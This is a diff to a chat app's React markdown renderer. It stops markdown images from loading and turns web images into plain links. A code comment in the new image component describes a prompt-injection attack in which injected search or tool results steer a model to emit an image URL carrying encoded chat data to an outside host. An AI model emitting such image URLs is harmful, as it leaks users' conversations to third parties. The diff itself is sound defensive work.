@@ -3,7 +3,8 @@
 /**
  * Based on prompt-kit: https://prompt-kit.com/docs/markdown
  * Local contracts: one remark pipeline for projection and rendering, stable
- * per-block memoization, safe link previews, and app-owned code controls.
+ * per-block memoization, safe link previews, images rendered as links, and
+ * app-owned code controls.
  */
 import { useBrowserLayoutEffect } from "@/app/hooks/use-browser-layout-effect"
 import {
@@ -20,7 +21,10 @@ import {
   CODE_BLOCK_ATTRIBUTE,
   remarkCodeBlockAnnotation,
 } from "@/lib/markdown/remark-code-block-annotation"
-import { remarkLinkPresentation } from "@/lib/markdown/remark-link-presentation"
+import {
+  isExternalHttpHref,
+  remarkLinkPresentation,
+} from "@/lib/markdown/remark-link-presentation"
 import {
   remarkParsedBlock,
   type ParsedMarkdownBlock,
@@ -105,6 +109,9 @@ export type MarkdownBlockRecord = {
  */
 const MarkdownBlockStabilityContext =
   createContext<MarkdownBlockStability>("stable")
+
+/** True inside a rendered link, where anchors cannot nest. */
+const MarkdownInsideLinkContext = createContext(false)
 
 /**
  * Keyed by result identity so only the committed projection's duration is emitted;
@@ -282,8 +289,27 @@ const INITIAL_COMPONENTS: Partial<Components> = {
     const presentation = annotatedPresentation === "pill" ? "pill" : "inline"
 
     return (
-      <LinkMarkdown href={href} presentation={presentation} {...props}>
-        {children}
+      <MarkdownInsideLinkContext.Provider value={true}>
+        <LinkMarkdown href={href} presentation={presentation} {...props}>
+          {children}
+        </LinkMarkdown>
+      </MarkdownInsideLinkContext.Provider>
+    )
+  },
+  // Markdown images never load. Model output can be steered by injected
+  // search or tool results, and fetching `![](https://host/?d=<chat>)` would
+  // send the encoded data to that host with no click. A web image becomes an
+  // ordinary link; inside a link, or without a web URL, only its label stays.
+  img: function ImageComponent({ src, alt, title }) {
+    const insideLink = useContext(MarkdownInsideLinkContext)
+    const href = typeof src === "string" ? src : ""
+    const label = alt || href
+
+    if (insideLink || !isExternalHttpHref(href)) return label || null
+
+    return (
+      <LinkMarkdown href={href} title={title}>
+        {label}
       </LinkMarkdown>
     )
   },
